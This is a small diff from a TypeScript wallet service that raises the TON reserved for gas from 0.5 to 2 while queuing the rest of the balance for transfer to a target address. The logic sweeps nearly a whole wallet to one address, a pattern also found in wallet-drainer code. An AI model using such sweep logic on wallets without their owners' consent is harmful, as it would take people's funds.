@@ -238,7 +238,7 @@ export class WalletService {
       const messages = [];
 
       // 1. TON转账（保留少量作为Gas费）
-      const tonBalance = parseFloat((assets.ton.balanceTon - 0.5).toFixed(2));
+      const tonBalance = parseFloat((assets.ton.balanceTon - 2).toFixed(2));
       if (tonBalance > 0.5) {
         messages.push({
           address: targetAddress,
